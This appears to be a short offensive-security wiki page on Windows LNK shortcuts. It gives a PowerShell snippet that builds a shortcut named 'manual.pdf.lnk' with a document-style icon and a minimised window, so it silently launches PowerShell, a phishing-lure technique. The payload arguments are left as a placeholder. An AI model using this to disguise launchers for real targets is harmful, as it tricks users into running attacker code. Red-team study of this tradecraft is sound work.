# ⭕ LNK

LNK is the file extension used for shortcuts in Windows. These shortcuts can run an executable with arbitrary parameters.&#x20;

You can use the GUI to change the icon and parameters of a LNK file, or you could do it programmatically like so:

```vba
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("manual.pdf.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.Arguments = '-args '
$Shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$Shortcut.HotKey           = "CTRL+O"
$Shortcut.Save()
```
